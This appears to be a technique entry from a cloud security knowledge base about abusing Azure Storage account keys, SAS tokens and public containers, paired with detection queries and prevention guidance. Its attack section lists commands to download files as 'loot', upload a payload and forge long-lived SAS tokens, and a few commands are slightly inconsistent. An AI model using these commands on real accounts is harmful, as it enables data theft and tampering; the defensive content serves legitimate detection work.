name: Azure Storage - SAS Token & Account Key Abuse
description: Abuse over-permissive Azure Storage access: leaked account keys (full control of a storage account), overly broad or long-lived SAS tokens, and anonymously readable blob containers. These let an attacker read and often write blobs, exfiltrate data, or plant malicious content - and account keys cannot be scoped or easily revoked without rotation that breaks every consumer.
notes:
=== THREE ABUSE PATHS ===
  1. Account key  -> full read/write/delete of the whole storage account.
  2. SAS token    -> scoped URL; but over-broad (rwdlacup) or long-lived SAS
                     still grants wide access if leaked.
  3. Anonymous    -> containers set to public Blob/Container access need no auth.

=== ANONYMOUS CONTAINER (no creds) ===
  curl 'https://<target>.blob.core.windows.net/<share>?restype=container&comp=list'
  az storage blob list --account-name <target> --container-name <share> --auth-mode login

=== WITH A SAS TOKEN ===
  az storage blob list --account-name <target> \
    --container-name <share> --sas-token '<token>'
  az storage blob download --account-name <target> --container-name <share> \
    --name secret.txt --file loot.txt --sas-token '<token>'

=== WITH AN ACCOUNT KEY (full control) ===
  az storage account keys list --account-name <target> -g <rg>   # if you can read keys
  az storage container list --account-name <target> --account-key <token>
  az storage blob upload --account-name <target> --account-key <token> \
    --container-name <share> --name payload.html --file payload.html

=== INSPECT / FORGE SAS (with a key) ===
  az storage container generate-sas --account-name <target> \
    --name <share> --permissions rwdl --account-key <token> \
    --expiry 2030-01-01

=== FIND LEAKS ===
  SAS URLs leak in code, git history, config, Logic Apps, emails.

ARM enumeration to find storage accounts and keys.
A managed identity may hold Storage data-plane roles.

defense.why_it_works: Account keys grant unscoped full control and are shared static secrets; SAS tokens are bearer URLs that work for anyone who holds them until expiry; anonymous access serves blobs with no authentication. Over-broad configuration of any of these turns a leaked string or a public setting into data access.
defense.prerequisites: A leaked account key or SAS token, or a container configured for anonymous Blob/Container public access; for forging SAS, possession of (or the ability to list) an account key.
defense.impact: Read/write/delete of blob data - exfiltration of sensitive files, tampering with served content (e.g. static sites, scripts), and in the account-key case full control over the storage account.
defense.detection: [MITRE T1530] Storage diagnostic/StorageRead-StorageWrite logs showing access via SAS (authenticationType=SAS) or account key from unexpected IPs; anonymous (AnonymousSuccess) reads; az storage account keys list in Azure Activity; blob access from new ASNs.
defense.artifacts: Azure Monitor StorageBlobLogs (AuthenticationType, CallerIpAddress, Uri), Azure Activity 'List Storage Account Keys' operation, diagnostic settings showing anonymous success.
defense.splunk_spl:
index=azure sourcetype=azure:activity operationName="*listKeys*" OR operationNameValue="MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION"
| stats count by caller, resourceId, callerIpAddress
defense.sentinel_kql:
StorageBlobLogs
| where AuthenticationType in ("SAS","Anonymous")
| summarize Count=count(), Ops=make_set(OperationName) by CallerIpAddress, AccountName, AuthenticationType
| union (AzureActivity | where OperationNameValue has "listKeys")
defense.prevention: Disable anonymous blob access at the account level; disable shared-key authorization and use Entra ID (RBAC) for the data plane; if SAS is required use short-lived user-delegation SAS with minimal permissions and a stored access policy for revocation; rotate account keys and store none in code; enable storage logging and alert on key listing and anonymous access.

detections.name: Storage access via SAS/anonymous or account-key listing
detections.logic:
StorageBlobLogs
| where AuthenticationType in ("SAS","Anonymous")
| summarize Count=count(), Ops=make_set(OperationName) by CallerIpAddress, AccountName, AuthenticationType
| where Count > 50
detections.false_positives: Legitimate apps/CDNs that use SAS or public containers for distribution
detections.tuning: Baseline expected SAS caller IPs and public containers; alert on new IPs/ASNs and on any listKeys outside change windows
